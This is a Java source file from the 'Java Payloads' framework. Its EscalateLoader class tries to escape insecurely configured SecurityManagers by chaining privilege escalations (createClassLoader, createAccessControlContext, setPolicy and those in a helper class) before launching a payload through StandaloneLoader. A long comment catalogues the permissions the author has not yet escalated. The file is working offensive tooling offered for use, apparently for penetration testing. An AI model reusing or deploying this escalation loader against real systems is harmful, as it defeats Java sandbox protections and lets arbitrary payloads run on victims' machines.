/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.escalate;

import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

import javapayload.loader.StandaloneLoader;

/**
 * Payload loader that tries to escalate insecurely configured
 * {@link SecurityManager}s before loading the payload.
 */
public class EscalateLoader implements PrivilegedExceptionAction {

	private static boolean escalate() throws Exception {
		if (EscalateBasics.escalate())
			return true;
		if (escalateComplex())
			return true;
		return ((Boolean) AccessController.doPrivileged(new EscalateLoader())).booleanValue();
	}

	/**
	 * Privilege escalations that need access to other classes.
	 * 
	 * @return <code>true</code> if escalation succeeded
	 */
	private static boolean escalateComplex() throws Exception {
		// +RuntimePermission(createClassLoader)
		try {
			new EscalateCreateClassLoader();
			return true;
		} catch (SecurityException ex) {
		}

		// +SecurityPermission(createAccessControlContext)
		try {
			new EscalateCreateAccessControlContext();
			return true;
		} catch (SecurityException ex) {
		}

		// +SecurityPermission(setPolicy)
		try {
			new EscalateSetPolicy();
			return true;
		} catch (SecurityException ex) {
			ex.printStackTrace();
		}

		return false;
	}

	public static void main(String[] args) throws Exception {
		escalate();
		StandaloneLoader.main(args);
	}

	public Object run() throws Exception {
		if (EscalateBasics.escalate())
			return Boolean.TRUE;
		if (escalateComplex())
			return Boolean.TRUE;
		return Boolean.FALSE;
	}

	// LIST OF PERMISSIONS:
	// http://docs.oracle.com/javase/1.5.0/docs/guide/security/permissions.html

	// PERMISSIONS ESCALATABLE IN ESCALATEBASICS:
	// +RuntimePermission(setSecurityManager)
	// +RuntimePermission(accessDeclaredMembers)
	// +ReflectPermission(suppressAccessChecks)

	// PERMISSIONS NOT (YET) ESCALATABLE:
	// +SecurityPermission(getDomainCombiner)
	// +SecurityPermission(getPolicy)
	// +SecurityPermission(getProperty.{key})
	// +SecurityPermission(setProperty.{key})
	// +SecurityPermission(insertProvider.{providername})
	// +SecurityPermission(removeProvider.{providername})
	// +SecurityPermission(setSystemScope)
	// +SecurityPermission(setIdentityPublicKey)
	// +SecurityPermission(setIdentityInfo)
	// +SecurityPermission(addIdentityCertificate)
	// +SecurityPermission(removeIdentityCertificate)
	// +SecurityPermission(printIdentity)
	// +SecurityPermission(clearProviderProperties.{providername})
	// +SecurityPermission(putProviderProperty.{providername})
	// +SecurityPermission(removeProviderProperty.{providername})
	// +SecurityPermission(getSignerPrivateKey)
	// +SecurityPermission(setSignerKeyPair)
	// +AWTPermission(*)
	// +FilePermission(*,read)
	// +FilePermission(*,write)
	// +FilePermission(*,execute)
	// +FilePermission(*,delete)
	// +SerializablePermission(enableSubclassImplementation)
	// +SerializablePermission(enableSubstitution)
	// +RuntimePermission(getClassLoader)
	// +RuntimePermission(setContextClassLoader)
	// +RuntimePermission(createSecurityManager)
	// +RuntimePermission(exitVM)
	// +RuntimePermission(shutdownHooks)
	// +RuntimePermission(setFactory)
	// +RuntimePermission(setIO)
	// +RuntimePermission(modifyThread)
	// +RuntimePermission(stopThread)
	// +RuntimePermission(modifyThreadGroup)
	// +RuntimePermission(getProtectionDomain)
	// +RuntimePermission(readFileDescriptor)
	// +RuntimePermission(writeFileDescriptor)
	// +RuntimePermission(loadLibrary.{library name})
	// +RuntimePermission(accessClassInPackage.{package name})
	// +RuntimePermission(defineClassInPackage. {package name})
	// +RuntimePermission(queuePrintJob)
	// +RuntimePermission(selectorProvider)
	// +RuntimePermission(charsetProvider)
	// +NetPermission(setDefaultAuthenticator)
	// +NetPermission(requestPasswordAuthentication)
	// +NetPermission(specifyStreamHandler)
	// +SocketPermission(*,accept)
	// +SocketPermission(*,connect)
	// +SocketPermission(*,listen)
	// +SocketPermission(*,resolve)
	// +SQLPermission(setLog)
	// +PropertyPermission(*,read)
	// +PropertyPermission(*,write)
	// +LoggingPermission(control)
	// +SSLPermission(setHostnameVerifier)
	// +SSLPermission(getSSLSessionContext)
	// +AuthPermission(doAs)
	// +AuthPermission(doAsPrivileged)
	// +AuthPermission(getSubject)
	// +AuthPermission(getSubjectFromDomainCombiner)
	// +AuthPermission(setReadOnly)
	// +AuthPermission(modifyPrincipals)
	// +AuthPermission(modifyPublicCredentials)
	// +AuthPermission(modifyPrivateCredentials)
	// +AuthPermission(refreshCredential)
	// +AuthPermission(destroyCredential)
	// +AuthPermission(createLoginContext.{name})
	// +AuthPermission(getLoginConfiguration)
	// +AuthPermission(getLoginConfiguration)
	// +AuthPermission(setLoginConfiguration)
	// +AuthPermission(refreshLoginConfiguration)
	// +PrivateCredentialPermission(*,read)
	// +DelegationPermission(*)
	// +ServicePermission(*,initiate)
	// +ServicePermission(*,accept)
	// +AudioPermission(record)
	// +AudioPermission(play)
	// +ManagementPermission(*)
	// +MBeanPermission(*)
	// +MBeanServerPermission(*)
	// +MBeanTrustPermission(register)
}
